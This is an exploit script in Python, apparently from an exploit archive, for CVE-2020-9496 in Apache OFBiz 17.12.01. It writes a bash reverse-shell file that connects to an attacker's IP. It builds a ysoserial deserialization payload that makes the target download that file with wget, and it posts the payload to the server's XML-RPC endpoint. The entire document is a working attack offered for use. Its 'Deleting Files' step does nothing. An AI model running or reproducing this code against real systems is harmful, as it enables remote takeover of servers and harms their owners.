# Title:    ApacheOfBiz 17.12.01 - Remote Code Execution (RCE) 
# Date:     26.06.23
# Author:   Prepakis Georgios (birdlinux)
# Vendor:   https://ofbiz.apache.org/
# CVE:      CVE-2020-9496

import argparse
import requests

class ApacheOfBizExploit:
    def __init__(self, url, port, ip, ncport):
        self.url = url
        self.port = port
        self.ip = ip
        self.ncport = ncport

    def generate_shell_script(self):
        print("[*] Creating a shell file with bash\n")
        shell_script = "#!/bin/bash\n/bin/bash -i >& /dev/tcp/{0}/{1} 0>&1".format(self.ip, self.ncport)
        with open("shell.sh", "w") as file:
            file.write(shell_script)

    def download_yso_serial_jar(self):
        print("[*] Downloading YsoSerial JAR File\n")
        jar_url = "https://jitpack.io/com/github/frohoff/ysoserial/master-d367e379d9-1/ysoserial-master-d367e379d9-1.jar"
        response = requests.get(jar_url)
        with open("ysoserial.jar", "wb") as file:
            file.write(response.content)

    def generate_payload(self):
        print("[*] Generating a JAR payload\n")
        payload_command = "wget {0}/shell.sh -O /tmp/shell.sh".format(self.ip)
        payload = "java -jar ysoserial.jar CommonsBeanutils1 \"{0}\" | base64 | tr -d \"\\n\"".format(payload_command)
        return payload

    def send_malicious_shell(self, payload):
        print("[*] Sending malicious shell to the server...\n")
        headers = {'Content-Type': 'application/xml'}
        data = "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'>{0}</serializable></value></member></struct></value></param></params></methodCall>".format(payload)
        requests.post("{0}:{1}/webtools/control/xmlrpc".format(self.url, self.port), data=data, headers=headers, verify=False)

    def exploit(self):
        self.generate_shell_script()
        self.download_yso_serial_jar()
        payload = self.generate_payload()
        self.send_malicious_shell(payload)
        print("[*] Deleting Files...")


def main():
    parser = argparse.ArgumentParser(description="ApacheOfBiz 17.12.01 - Remote Code Execution (RCE) Exploit")
    parser.add_argument("-u", "--url", help="Target URL (e.g., https://127.0.0.1)")
    parser.add_argument("-p", "--port", type=int, help="Target port (e.g., 8443)")
    parser.add_argument("-i", "--ip", help="Attacker's IP address")
    parser.add_argument("-n", "--ncport", type=int, help="Attacker's netcat listener port")

    args = parser.parse_args()

    if not all(vars(args).values()):
        parser.error("Please provide all the required arguments.")
    else:
        exploit = ApacheOfBizExploit(args.url, args.port, args.ip, args.ncport)
        exploit.exploit()


if __name__ == "__main__":
    main()
